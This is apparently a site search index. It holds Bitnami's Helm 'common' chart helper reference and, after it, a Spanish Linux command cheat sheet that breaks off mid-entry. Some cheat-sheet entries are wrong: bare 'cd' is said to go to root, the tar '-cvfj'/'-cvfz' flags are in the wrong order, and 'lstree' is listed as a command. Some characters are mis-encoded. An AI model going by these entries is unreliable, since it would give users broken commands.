name. <code>.</code> Chart context <code>common.names.namespace</code> Allow the release namespace to be overridden <code>.</code> Chart context <code>common.names.fullname.namespace</code> Create a fully qualified app name adding the installation's namespace <code>.</code> Chart context <code>common.names.chart</code> Chart name plus version <code>.</code> Chart context"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#secrets","title":"Secrets","text":"Helper identifier Description Expected Input <code>common.secrets.name</code> Generate the name of the secret. <code>dict \"existingSecret\" .Values.path.to.the.existingSecret \"defaultNameSuffix\" \"mySuffix\" \"context\" $</code> see ExistingSecret for the structure. <code>common.secrets.key</code> Generate secret key. <code>dict \"existingSecret\" .Values.path.to.the.existingSecret \"key\" \"keyName\"</code> see ExistingSecret for the structure. <code>common.passwords.manage</code> Generate secret password or retrieve one if already created. <code>dict \"secret\" \"secret-name\" \"key\" \"keyName\" \"providedValues\" (list \"path.to.password1\" \"path.to.password2\") \"length\" 10 \"strong\" false \"chartName\" \"chartName\" \"context\" $</code>, length, strong and chartNAme fields are optional. <code>common.secrets.exists</code> Returns whether a previous generated secret already exists. <code>dict \"secret\" \"secret-name\" \"context\" $</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#storage","title":"Storage","text":"Helper identifier Description Expected Input <code>common.storage.class</code> Return  the proper Storage Class <code>dict \"persistence\" .Values.path.to.the.persistence \"global\" $</code>, see Persistence for the structure."},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#tplvalues","title":"TplValues","text":"Helper identifier Description Expected Input <code>common.tplvalues.render</code> Renders a value that contains template <code>dict \"value\" .Values.path.to.the.Value \"context\" $</code>, value is the value should rendered as template, context frequently is the chart context <code>$</code> or <code>.</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#utils","title":"Utils","text":"Helper identifier Description Expected Input <code>common.utils.fieldToEnvVar</code> Build environment variable name given a field. <code>dict \"field\" \"my-password\"</code> <code>common.utils.secret.getvalue</code> Print instructions to get a secret value. <code>dict \"secret\" \"secret-name\" \"field\" \"secret-value-field\" \"context\" $</code> <code>common.utils.getValueFromKey</code> Gets a value from <code>.Values</code> object given its key path <code>dict \"key\" \"path.to.key\" \"context\" $</code> <code>common.utils.getKeyFromList</code> Returns first <code>.Values</code> key with a defined value or first of the list if all non-defined <code>dict \"keys\" (list \"path.to.key1\" \"path.to.key2\") \"context\" $</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#validations","title":"Validations","text":"Helper identifier Description Expected Input <code>common.validations.values.single.empty</code> Validate a value must not be empty. <code>dict \"valueKey\" \"path.to.value\" \"secret\" \"secret.name\" \"field\" \"my-password\" \"subchart\" \"subchart\" \"context\" $</code> secret, field and subchart are optional. In case they are given, the helper will generate a how to get instruction. See ValidateValue <code>common.validations.values.multiple.empty</code> Validate a multiple values must not be empty. It returns a shared error for all the values. <code>dict \"required\" (list $validateValueConf00 $validateValueConf01) \"context\" $</code>. See ValidateValue <code>common.validations.values.mariadb.passwords</code> This helper will ensure required password for MariaDB are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"mariadb-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use mariadb chart and the helper. <code>common.validations.values.mysql.passwords</code> This helper will ensure required password for MySQL are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"mysql-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use mysql chart and the helper. <code>common.validations.values.postgresql.passwords</code> This helper will ensure required password for PostgreSQL are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"postgresql-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use postgresql chart and the helper. <code>common.validations.values.redis.passwords</code> This helper will ensure required password for Redis\u00ae are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"redis-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use redis chart and the helper. <code>common.validations.values.cassandra.passwords</code> This helper will ensure required password for Cassandra are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"cassandra-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use cassandra chart and the helper. <code>common.validations.values.mongodb.passwords</code> This helper will ensure required password for MongoDB\u00ae are not empty. It returns a shared error for all the values. <code>dict \"secret\" \"mongodb-secret\" \"subchart\" \"true\" \"context\" $</code> subchart field is optional and could be true or false it depends on where you will use mongodb chart and the helper."},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#warnings","title":"Warnings","text":"Helper identifier Description Expected Input <code>common.warnings.rollingTag</code> Warning about using rolling tag. <code>ImageRoot</code> see ImageRoot for the structure."},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#special-input-schemas","title":"Special input schemas","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#imageroot","title":"ImageRoot","text":"<pre><code>registry:\n  type: string\n  description: Docker registry where the image is located\n  example: docker.io\n\nrepository:\n  type: string\n  description: Repository and image name\n  example: bitnami/nginx\n\ntag:\n  type: string\n  description: image tag\n  example: 1.16.1-debian-10-r63\n\npullPolicy:\n  type: string\n  description: Specify a imagePullPolicy. Defaults to 'Always' if image tag is 'latest', else set to 'IfNotPresent'\n\npullSecrets:\n  type: array\n  items:\n    type: string\n  description: Optionally specify an array of imagePullSecrets (evaluated as templates).\n\ndebug:\n  type: boolean\n  description: Set to true if you would like to see extra information on logs\n  example: false\n\n## An instance would be:\n# registry: docker.io\n# repository: bitnami/nginx\n# tag: 1.16.1-debian-10-r63\n# pullPolicy: IfNotPresent\n# debug: false\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#persistence","title":"Persistence","text":"<pre><code>enabled:\n  type: boolean\n  description: Whether enable persistence.\n  example: true\n\nstorageClass:\n  type: string\n  description: Ghost data Persistent Volume Storage Class, If set to \"-\", storageClassName: \"\" which disables dynamic provisioning.\n  example: \"-\"\n\naccessMode:\n  type: string\n  description: Access mode for the Persistent Volume Storage.\n  example: ReadWriteOnce\n\nsize:\n  type: string\n  description: Size the Persistent Volume Storage.\n  example: 8Gi\n\npath:\n  type: string\n  description: Path to be persisted.\n  example: /bitnami\n\n## An instance would be:\n# enabled: true\n# storageClass: \"-\"\n# accessMode: ReadWriteOnce\n# size: 8Gi\n# path: /bitnami\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#existingsecret","title":"ExistingSecret","text":"<pre><code>name:\n  type: string\n  description: Name of the existing secret.\n  example: mySecret\nkeyMapping:\n  description: Mapping between the expected key name and the name of the key in the existing secret.\n  type: object\n\n## An instance would be:\n# name: mySecret\n# keyMapping:\n#   password: myPasswordKey\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#example-of-use","title":"Example of use","text":"<p>When we store sensitive data for a deployment in a secret, some times we want to give to users the possibility of using theirs existing secrets.</p> <pre><code># templates/secret.yaml\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: {{ include \"common.names.fullname\" . }}\n  labels:\n    app: {{ include \"common.names.fullname\" . }}\ntype: Opaque\ndata:\n  password: {{ .Values.password | b64enc | quote }}\n\n# templates/dpl.yaml\n---\n...\n      env:\n        - name: PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: {{ include \"common.secrets.name\" (dict \"existingSecret\" .Values.existingSecret \"context\" $) }}\n              key: {{ include \"common.secrets.key\" (dict \"existingSecret\" .Values.existingSecret \"key\" \"password\") }}\n...\n\n# values.yaml\n---\nname: mySecret\nkeyMapping:\n  password: myPasswordKey\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#validatevalue","title":"ValidateValue","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#notestxt","title":"NOTES.txt","text":"<pre><code>{{- $validateValueConf00 := (dict \"valueKey\" \"path.to.value00\" \"secret\" \"secretName\" \"field\" \"password-00\") -}}\n{{- $validateValueConf01 := (dict \"valueKey\" \"path.to.value01\" \"secret\" \"secretName\" \"field\" \"password-01\") -}}\n\n{{ include \"common.validations.values.multiple.empty\" (dict \"required\" (list $validateValueConf00 $validateValueConf01) \"context\" $) }}\n</code></pre> <p>If we force those values to be empty we will see some alerts</p> <pre><code>$ helm install test mychart --set path.to.value00=\"\",path.to.value01=\"\"\n    'path.to.value00' must not be empty, please add '--set path.to.value00=$PASSWORD_00' to the command. To get the current value:\n\n        export PASSWORD_00=$(kubectl get secret --namespace default secretName -o jsonpath=\"{.data.password-00}\" | base64 -d)\n\n    'path.to.value01' must not be empty, please add '--set path.to.value01=$PASSWORD_01' to the command. To get the current value:\n\n        export PASSWORD_01=$(kubectl get secret --namespace default secretName -o jsonpath=\"{.data.password-01}\" | base64 -d)\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#upgrading","title":"Upgrading","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#to-100","title":"To 1.0.0","text":"<p>On November 13, 2020, Helm v2 support was formally finished, this major version is the result of the required changes applied to the Helm Chart to be able to incorporate the different features added in Helm v3 and to be consistent with the Helm project itself regarding the Helm v2 EOL.</p> <p>What changes were introduced in this major version?</p> <ul> <li>Previous versions of this Helm Chart use <code>apiVersion: v1</code> (installable by both Helm 2 and 3), this Helm Chart was updated to <code>apiVersion: v2</code> (installable by Helm 3 only). Here you can find more information about the <code>apiVersion</code> field.</li> <li>Use <code>type: library</code>. Here you can find more information.</li> <li>The different fields present in the Chart.yaml file has been ordered alphabetically in a homogeneous way for all the Bitnami Helm Charts</li> </ul> <p>Considerations when upgrading to this version</p> <ul> <li>If you want to upgrade to this version from a previous one installed with Helm v3, you shouldn't face any issues</li> <li>If you want to upgrade to this version using Helm v2, this scenario is not supported as this version doesn't support Helm v2 anymore</li> <li>If you installed the previous version with Helm v2 and wants to upgrade to this version with Helm v3, please refer to the official Helm documentation about migrating from Helm v2 to v3</li> </ul> <p>Useful links</p> <ul> <li>https://docs.bitnami.com/tutorials/resolve-helm2-helm3-post-migration-issues/</li> <li>https://helm.sh/docs/topics/v2_v3_migration/</li> <li>https://helm.sh/blog/migrate-from-helm-v2-to-helm-v3/</li> </ul>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#license","title":"License","text":"<p>Copyright \u00a9 2022 Bitnami</p> <p>Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at</p> <pre><code>http://www.apache.org/licenses/LICENSE-2.0\n</code></pre> <p>Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.</p>"},{"location":"Linux/Commands/","title":"Commands","text":""},{"location":"Linux/Commands/#informacion-del-sistema","title":"Informaci\u00f3n del sistema","text":"<ul> <li>arch: mostrar la arquitectura de la m\u00e1quina (1).</li> <li>uname -m: mostrar la arquitectura de la m\u00e1quina (2).</li> <li>uname -r: mostrar la versi\u00f3n del kernel usado.</li> <li>dmidecode -q: mostrar los componentes (hardware) del sistema.</li> <li>hdparm -i /dev/hda: mostrar las caracter\u00edsticas de un disco duro.</li> <li>hdparm -tT /dev/sda: realizar prueba de lectura en un disco duro.</li> <li>cat /proc/cpuinfo: mostrar informaci\u00f3n de la CPU.</li> <li>cat /proc/interrupts: mostrar las interrupciones.</li> <li>cat /proc/meminfo: verificar el uso de memoria.</li> <li>cat /proc/swaps: mostrar ficheros swap.</li> <li>cat /proc/version: mostrar la versi\u00f3n del kernel.</li> <li>cat /proc/net/dev: mostrar adaptadores de red y estad\u00edsticas.</li> <li>cat /proc/mounts: mostrar el sistema de ficheros montado.</li> <li>lspci -tv: mostrar los dispositivos PCI.</li> <li>lsusb -tv: mostrar los dispositivos USB.</li> <li>date: mostrar la fecha del sistema.</li> <li>cal 2011: mostrar el almanaque de 2011.</li> <li>cal 07 2011: mostrar el almanaque para el mes julio de 2011.</li> <li>date 041217002011.00: colocar (declarar, ajustar) fecha y hora.</li> <li>clock -w: guardar los cambios de fecha en la BIOS.</li> </ul>"},{"location":"Linux/Commands/#apagar-reiniciar-sistema-o-cerrar-sesion","title":"Apagar (Reiniciar Sistema o Cerrar Sesi\u00f3n)","text":"<ul> <li>shutdown -h now: apagar el sistema (1).</li> <li>init 0: apagar el sistema (2).</li> <li>telinit 0: apagar el sistema (3).</li> <li>halt: apagar el sistema (4).</li> <li>shutdown -h hours:minutes &amp;: apagado planificado del sistema.</li> <li>shutdown -c: cancelar un apagado planificado del sistema.</li> <li>shutdown -r now: reiniciar (1).</li> <li>reboot: reiniciar (2).</li> <li>logout: cerrar sesi\u00f3n.</li> </ul>"},{"location":"Linux/Commands/#archivos-y-directorios","title":"Archivos y Directorios","text":"<ul> <li>cd /home: entrar en el directorio \u201chome\u201d.</li> <li>cd ..: retroceder un nivel.</li> <li>cd ../..: retroceder 2 niveles.</li> <li>cd: ir al directorio ra\u00edz.</li> <li>cd ~user1: ir al directorio user1.</li> <li>cd -: ir (regresar) al directorio anterior.</li> <li>pwd: mostrar el camino del directorio de trabajo.</li> <li>ls: ver los ficheros de un directorio.</li> <li>ls -F: ver los ficheros de un directorio.</li> <li>ls -l: mostrar los detalles de ficheros y carpetas de un directorio.</li> <li>ls -a: mostrar los ficheros ocultos.</li> <li>ls *[0-9]*: mostrar los ficheros y carpetas que contienen n\u00fameros.</li> <li>tree: mostrar los ficheros y carpetas en forma de \u00e1rbol comenzando por la ra\u00edz.(1)</li> <li>lstree: mostrar los ficheros y carpetas en forma de \u00e1rbol comenzando por la ra\u00edz.(2)</li> <li>mkdir dir1: crear una carpeta o directorio con nombre \u2018dir1?.</li> <li>mkdir dir1 dir2: crear dos carpetas o directorios simult\u00e1neamente (Crear dos directorios a la vez).</li> <li>mkdir -p /tmp/dir1/dir2: crear un \u00e1rbol de directorios.</li> <li>rm -f file1: borrar el fichero llamado \u2018file1?.</li> <li>rmdir dir1: borrar la carpeta llamada \u2018dir1?.</li> <li>rm -rf dir1: eliminar una carpeta llamada \u2018dir1? con su contenido de forma recursiva. (Si lo borro recursivo estoy diciendo que es con su contenido).</li> <li>rm -rf dir1 dir2: borrar dos carpetas (directorios) con su contenido de forma recursiva.</li> <li>mv dir1 new_dir: renombrar o mover un fichero o carpeta (directorio).</li> <li>cp file1: copiar un fichero.</li> <li>cp file1 file2: copiar dos ficheros al un\u00edsono.</li> <li>cp dir /* .: copiar todos los ficheros de un directorio dentro del directorio de trabajo actual.</li> <li>cp -a /tmp/dir1 .: copiar un directorio dentro del directorio actual de trabajo.</li> <li>cp -a dir1: copiar un directorio.</li> <li>cp -a dir1 dir2: copiar dos directorio al un\u00edsono.</li> <li>ln -s file1 lnk1: crear un enlace simb\u00f3lico al fichero o directorio.</li> <li>ln file1 lnk1: crear un enlace f\u00edsico al fichero o directorio.</li> <li>touch -t 0712250000 file1: modificar el tiempo real (tiempo de creaci\u00f3n) de un fichero o directorio.</li> <li>file file1: salida (volcado en pantalla) del tipo mime de un fichero texto.</li> <li>iconv -l: listas de cifrados conocidos.</li> <li>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile: crea una nueva forma del fichero de entrada asumiendo que est\u00e1 codificado en fromEncoding y convirti\u00e9ndolo a ToEncoding.</li> <li>find . -maxdepth 1 -name *.jpg -print -exec convert \u201d{}\u201d -resize 80\u00d760 \u201cthumbs/{}\u201d \\;: agrupar ficheros redimensionados en el directorio actual y enviarlos a directorios en vistas de miniaturas (requiere convertir desde ImagemagicK).</li> </ul>"},{"location":"Linux/Commands/#encontrar-archivos","title":"Encontrar archivos","text":"<ul> <li>find / -name file1: buscar fichero y directorio a partir de la ra\u00edz del sistema.</li> <li>find / -user user1: buscar ficheros y directorios pertenecientes al usuario \u2018user1?.</li> <li>find /home/user1 -name *.bin: buscar ficheros con extensi\u00f3n \u2018. bin\u2019 dentro del directorio \u2018/ home/user1?.</li> <li>find /usr/bin -type f -atime +100: buscar ficheros binarios no usados en los \u00faltimos 100 d\u00edas.</li> <li>find /usr/bin -type f -mtime -10: buscar ficheros creados o cambiados dentro de los \u00faltimos 10 d\u00edas.</li> <li>find / -name *.rpm -exec chmod 755 \u2018{}\u2019 \\;: buscar ficheros con extensi\u00f3n \u2018.rpm\u2019 y modificar permisos.</li> <li>find / -xdev -name *.rpm: Buscar ficheros con extensi\u00f3n \u2018.rpm\u2019 ignorando los dispositivos removibles como cdrom, pen-drive, etc.\u2026</li> <li>locate *.ps: encuentra ficheros con extensi\u00f3n \u2018.ps\u2019 ejecutados primeramente con el command \u2018updatedb\u2019.</li> <li>whereis halt: mostrar la ubicaci\u00f3n de un fichero binario, de ayuda o fuente. En este caso pregunta d\u00f3nde est\u00e1 el comando \u2018halt\u2019.</li> <li>which halt: mostrar la senda completa (el camino completo) a un binario / ejecutable.</li> </ul>"},{"location":"Linux/Commands/#montando-un-sistema-de-ficheros","title":"Montando un sistema de ficheros","text":"<ul> <li>mount /dev/hda2 /mnt/hda2: montar un disco llamado hda2. Verifique primero la existencia del directorio \u2018/ mnt/hda2?; si no est\u00e1, debe crearlo.</li> <li>umount /dev/hda2: desmontar un disco llamado hda2. Salir primero desde el punto \u2018/ mnt/hda2.</li> <li>fuser -km /mnt/hda2: forzar el desmontaje cuando el dispositivo est\u00e1 ocupado.</li> <li>umount -n /mnt/hda2: correr el desmontaje sin leer el fichero /etc/mtab. \u00datil cuando el fichero es de solo lectura o el disco duro est\u00e1 lleno.</li> <li>mount /dev/fd0 /mnt/floppy: montar un disco flexible (floppy).</li> <li>mount /dev/cdrom /mnt/cdrom: montar un cdrom / dvdrom.</li> <li>mount /dev/hdc /mnt/cdrecorder: montar un cd regrabable o un dvdrom.</li> <li>mount /dev/hdb /mnt/cdrecorder: montar un cd regrabable / dvdrom (un dvd).</li> <li>mount -o loop file.iso /mnt/cdrom: montar un fichero o una imagen iso.</li> <li>mount -t vfat /dev/hda5 /mnt/hda5: montar un sistema de ficheros FAT32.</li> <li>mount /dev/sda1 /mnt/usbdisk: montar un usb pen-drive o una memoria (sin especificar el tipo de sistema de ficheros).</li> </ul>"},{"location":"Linux/Commands/#espacio-de-disco-duro","title":"Espacio de Disco Duro","text":"<ul> <li>df -h: mostrar una lista de las particiones montadas.</li> <li>ls -lSr |more: mostrar el tama\u00f1o de los ficheros y directorios ordenados por tama\u00f1o.</li> <li>du -sh dir1: Estimar el espacio usado por el directorio \u2018dir1?.</li> <li>du -sk * | sort -rn: mostrar el tama\u00f1o de los ficheros y directorios ordenados por tama\u00f1o.</li> <li>rpm -q -a \u2013qf \u2018%10{SIZE}t%{NAME}n\u2019 | sort -k1,1n: mostrar el espacio usado por los paquetes rpm instalados organizados por tama\u00f1o (Fedora, Redhat y otros).</li> <li>dpkg-query -W -f=\u2019${Installed-Size;10}t${Package}n\u2019 | sort -k1,1n: mostrar el espacio usado por los paquetes instalados, organizados por tama\u00f1o (Ubuntu, Debian y otros).</li> <li>du -bsh ./folder Tama\u00f1o d</li> </ul>"},{"location":"Linux/Commands/#usuarios-y-grupos","title":"Usuarios y Grupos","text":"<ul> <li>groupadd nombre_del_grupo: crear un nuevo grupo.</li> <li>groupdel nombre_del_grupo: borrar un grupo.</li> <li>groupmod -n nuevo_nombre_del_grupo viejo_nombre_del_grupo: renombrar un grupo.</li> <li>useradd -c \u201cName Surname \u201d -g admin -d /home/user1 -s /bin/bash user1: Crear un nuevo usuario perteneciente al grupo \u201cadmin\u201d.</li> <li>useradd user1: crear un nuevo usuario.</li> <li>userdel -r user1: borrar un usuario (\u2018-r\u2019 elimina el directorio Home).</li> <li>usermod -c \u201cUser FTP\u201d -g system -d /ftp/user1 -s /bin/nologin user1: cambiar los atributos del usuario.</li> <li>passwd: cambiar contrase\u00f1a.</li> <li>passwd user1: cambiar la contrase\u00f1a de un usuario (solamente por root).</li> <li>chage -E 2011-12-31 user1: colocar un plazo para la contrase\u00f1a del usuario. En este caso dice que la clave expira el 31 de diciembre de 2011.</li> <li>pwck: chequear la sintaxis correcta el formato de fichero de \u2018/etc/passwd\u2019 y la existencia de usuarios.</li> <li>grpck: chequear la sintaxis correcta y el formato del fichero \u2018/etc/group\u2019 y la existencia de grupos.</li> <li>newgrp group_name: registra a un nuevo grupo para cambiar el grupo predeterminado de los ficheros creados recientemente.</li> </ul>"},{"location":"Linux/Commands/#permisos-en-ficheros-usa-para-colocar-permisos-y-para-eliminar","title":"Permisos en Ficheros (Usa \u201d+\u201d para colocar permisos y \u201d-\u201d para eliminar)","text":"<ul> <li>ls -lh: Mostrar permisos.</li> <li>ls /tmp | pr -T5 -W$COLUMNS: dividir la terminal en 5 columnas.</li> <li>chmod ugo+rwx directory1: colocar permisos de lectura \u00ae, escritura (w) y ejecuci\u00f3n(x) al propietario (u), al grupo (g) y a otros (o) sobre el directorio \u2018directory1?.</li> <li>chmod go-rwx directory1: quitar permiso de lectura \u00ae, escritura (w) y (x) ejecuci\u00f3n al grupo (g) y otros (o) sobre el directorio \u2018directory1?.</li> <li>chown user1 file1: cambiar el due\u00f1o de un fichero.</li> <li>chown -R user1 directory1: cambiar el propietario de un directorio y de todos los ficheros y directorios contenidos dentro.</li> <li>chgrp group1 file1: cambiar grupo de ficheros.</li> <li>chown user1:group1 file1: cambiar usuario y el grupo propietario de un fichero.</li> <li>find / -perm -u+s: visualizar todos los ficheros del sistema con SUID configurado.</li> <li>chmod u+s /bin/file1: colocar el bit SUID en un fichero binario. El usuario que corriendo ese fichero adquiere los mismos privilegios como due\u00f1o.</li> <li>chmod u-s /bin/file1: deshabilitar el bit SUID en un fichero binario.</li> <li>chmod g+s /home/public: colocar un bit SGID en un directorio \u2013similar al SUID pero por directorio.</li> <li>chmod g-s /home/public: desabilitar un bit SGID en un directorio.</li> <li>chmod o+t /home/public: colocar un bit STIKY en un directorio. Permite el borrado de ficheros solamente a los due\u00f1os leg\u00edtimos.</li> <li>chmod o-t /home/public: desabilitar un bit STIKY en un directorio.</li> </ul>"},{"location":"Linux/Commands/#atributos-especiales-en-ficheros-usa-para-colocar-permisos-y-para-eliminar","title":"Atributos especiales en ficheros (Usa \u201d+\u201d para colocar permisos y \u201d-\u201d para eliminar)","text":"<ul> <li>chattr +a file1: permite escribir abriendo un fichero solamente modo append.</li> <li>chattr +c file1: permite que un fichero sea comprimido / descomprimido automaticamente.</li> <li>chattr +d file1: asegura que el programa ignore borrar los ficheros durante la copia de seguridad.</li> <li>chattr +i file1: convierte el fichero en invariable, por lo que no puede ser eliminado, alterado, renombrado, ni enlazado.</li> <li>chattr +s file1: permite que un fichero sea borrado de forma segura.</li> <li>chattr +S file1: asegura que un fichero sea modificado, los cambios son escritos en modo synchronous como con sync.</li> <li>chattr +u file1: te permite recuperar el contenido de un fichero a\u00fan si este est\u00e1 cancelado.</li> <li>lsattr: mostrar atributos especiales.</li> </ul>"},{"location":"Linux/Commands/#archivos-y-ficheros-comprimidos","title":"Archivos y Ficheros comprimidos","text":"<ul> <li>bunzip2 file1.bz2: descomprime in fichero llamado \u2018file1.bz2?.</li> <li>bzip2 file1: comprime un fichero llamado \u2018file1?.</li> <li>gunzip file1.gz: descomprime un fichero llamado \u2018file1.gz\u2019.</li> <li>gzip file1: comprime un fichero llamado \u2018file1?.</li> <li>gzip -9 file1: comprime con compresi\u00f3n m\u00e1xima.</li> <li>rar a file1.rar test_file: crear un fichero rar llamado \u2018file1.rar\u2019.</li> <li>rar a file1.rar file1 file2 dir1: comprimir \u2018file1?, \u2018file2? y \u2018dir1? simult\u00e1neamente.</li> <li>rar x file1.rar: descomprimir archivo rar.</li> <li>unrar x file1.rar: descomprimir archivo rar.</li> <li>tar -cvf archive.tar file1: crear un tarball descomprimido.</li> <li>tar -cvf archive.tar file1 file2 dir1: crear un archivo conteniendo \u2018file1?, \u2018file2? y\u2019dir1?.</li> <li>tar -tf archive.tar: mostrar los contenidos de un archivo.</li> <li>tar -xvf archive.tar: extraer un tarball.</li> <li>tar -xvf archive.tar -C /tmp: extraer un tarball en / tmp.</li> <li>tar -cvfj archive.tar.bz2 dir1: crear un tarball comprimido dentro de bzip2.</li> <li>tar -xvfj archive.tar.bz2: descomprimir un archivo tar comprimido en bzip2</li> <li>tar -cvfz archive.tar.gz dir1: crear un tarball comprimido en gzip.</li> <li>tar -xvfz archive.tar.gz: descomprimir un archive tar comprimido en gzip.</li> <li>zip file1.zip file1: crear un archivo comprimido en zip.</li> <li>zip -r file1.zip file1 file2 dir1: comprimir, en zip, varios archivos y directorios de forma simult\u00e1nea.</li> <li>unzip file1.zip: descomprimir un archivo zip.</li> </ul>"},{"location":"Linux/Commands/#paquetes-rpm-red-hat-fedora-y-similares","title":"Paquetes RPM (Red Hat, Fedora y similares)","text":"<ul> <li>rpm -ivh package.rpm: instalar un paquete rpm.</li> <li>rpm -ivh \u2013nodeeps package.rpm: instalar un paquete rpm ignorando las peticiones de dependencias.</li> <li>rpm -U package.rpm: actualizar un paquete rpm sin cambiar la configuraci\u00f3n de los ficheros.</li> <li>rpm -F package.rpm: actualizar un paquete rpm solamente si este est\u00e1 instalado.</li> <li>rpm -e package_name.rpm: eliminar un paquete rpm.</li> <li>rpm -qa: mostrar todos los paquetes rpm instalados en el sistema.</li> <li>rpm -qa | grep httpd: mostrar todos los paquetes rpm con el nombre \u201chttpd\u201d.</li> <li>rpm -qi package_name: obtener informaci\u00f3n en un paquete espec\u00edfico instalado.</li> <li>rpm -qg \u201cSystem Environment/Daemons\u201d: mostar los paquetes rpm de un grupo software.</li> <li>rpm -ql package_name: mostrar lista de ficheros dados por un paquete rpm instalado.</li> <li>rpm -qc package_name: mostrar lista de configuraci\u00f3n de ficheros dados por un paquete rpm instalado.</li> <li>rpm -q package_name \u2013whatrequires: mostrar lista de dependencias solicitada para un paquete rpm.</li> <li>rpm -q package_name \u2013whatprovides: mostar la capacidad dada por un paquete rpm.</li> <li>rpm -q package_name \u2013scripts: mostrar los scripts comenzados durante la instalaci\u00f3n /eliminaci\u00f3n.</li> <li>rpm -q package_name \u2013changelog: mostar el historial de revisions de un paquete rpm.</li> <li>rpm -qf /etc/httpd/conf/httpd.conf: verificar cu\u00e1l paquete rpm pertenece a un fichero dado.</li> <li>rpm -qp package.rpm -l: mostrar lista de ficheros dados por un paquete rpm que a\u00fan no ha sido instalado.</li> <li>rpm \u2013import /media/cdrom/RPM-GPG-KEY: importar la firma digital de la llave p\u00fablica.</li> <li>rpm \u2013checksig package.rpm: verificar la integridad de un paquete rpm.</li> <li>rpm -qa gpg-pubkey: verificar la integridad de todos los paquetes rpm instalados.</li> <li>rpm -V package_name: chequear el tama\u00f1o del fichero, licencias, tipos, due\u00f1o, grupo, chequeo de resumen de MD5 y \u00faltima modificaci\u00f3n.</li> <li>rpm -Va: chequear todos los paquetes rpm instalados en el sistema. Usar con cuidado.</li> <li>rpm -Vp package.rpm: verificar un paquete rpm no instalado todav\u00eda.</li> <li>rpm2cpio package.rpm | cpio \u2013extract \u2013make-directories *bin*: extraer fichero ejecutable desde un paquete rpm.</li> <li>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm: instalar un paquete construido desde una fuente rpm.</li> <li>rpmbuild \u2013rebuild package_name.src.rpm: construir un paquete rpm desde una fuente rpm.</li> </ul>"},{"location":"Linux/Commands/#actualizador-de-paquetes-yum-red-hat-fedora-y-similares","title":"Actualizador de paquetes YUM (Red Hat, Fedora y similares)","text":"<ul> <li>yum install package_name: descargar e instalar un paquete rpm.</li> <li>yum localinstall package_name.rpm: este instalar\u00e1 un RPM y tratar\u00e1 de resolver todas las dependencies para ti, usando tus repositorios.</li> <li>yum update package_name.rpm: actualizar todos los paquetes rpm instalados en el sistema.</li> <li>yum update package_name: modernizar / actualizar un paquete rpm.</li> <li>yum remove package_name: eliminar un paquete rpm.</li> <li>yum list: listar todos los paquetes instalados en el sistema.</li> <li>yum search package_name: Encontrar un paquete en repositorio rpm.</li> <li>yum clean packages: limpiar un cach\u00e9 rpm borrando los paquetes descargados.</li> <li>yum clean headers: eliminar todos los ficheros de encabezamiento que el sistema usa para resolver la dependencia.</li> <li>yum clean all: eliminar desde los paquetes cach\u00e9 y ficheros de encabezado. </li> </ul>"},{"location":"Linux/Commands/#gestion-de-paquetes-en-linux-con-yum","title":"Gesti\u00f3n de paquetes en Linux con Yum","text":""},{"location":"Linux/Commands/#paquetes-deb-debian-ubuntu-y-derivados","title":"Paquetes Deb (Debian, Ubuntu y derivados)","text":"<ul> <li>dpkg -i package.deb: instalar / actualizar un paquete deb.</li> <li>dpkg -r package_name: eliminar un paquete deb del sistema.</li> <li>dpkg -l: mostrar todos los paquetes deb instalados en el sistema.</li> <li>dpkg -l | grep httpd: mostrar todos los paquetes deb con el nombre \u201chttpd\u201d</li> <li>dpkg -s package_name: obtener informaci\u00f3n en un paquete espec\u00edfico instalado en el sistema.</li> <li>dpkg -L package_name: mostar lista de ficheros dados por un paquete instalado en el sistema.</li> <li>dpkg \u2013contents package.deb: mostrar lista de ficheros dados por un paquete no instalado todav\u00eda.</li> <li>dpkg -S /bin/ping: verificar cu\u00e1l paquete pertenece a un fichero dado.</li> </ul>"},{"location":"Linux/Commands/#actualizador-de-paquetes-apt-debian-ubuntu-y-derivados","title":"Actualizador de paquetes APT (Debian, Ubuntu y derivados)","text":"<ul> <li>apt-get install package_name: instalar / actualizar un paquete deb.</li> <li>apt-cdrom install package_name: instalar / actualizar un paquete deb desde un cdrom.</li> <li>apt-get update: actualizar la lista de paquetes.</li> <li>apt-get upgrade: actualizar todos los paquetes instalados.</li> <li>apt-get remove package_name: eliminar un paquete deb del sistema.</li> <li>apt-get check: verificar la 